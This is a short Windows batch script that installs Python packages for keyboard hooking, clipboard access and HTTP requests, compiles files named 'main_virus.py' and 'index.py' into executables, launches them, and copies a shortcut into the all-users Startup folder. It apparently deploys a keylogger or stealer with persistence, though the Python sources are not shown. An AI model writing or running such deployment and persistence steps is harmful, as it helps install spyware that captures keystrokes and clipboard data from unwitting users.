@echo off
pip install keyboard
pip install mklnk
pip install pyperclip
pip install comtypes
pipenv install requests
pyinstaller main_virus.py --onefile 
pyinstaller index.py --onefile 
start dist\main_virus.exe
start dist\index.exe

copy test.link C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
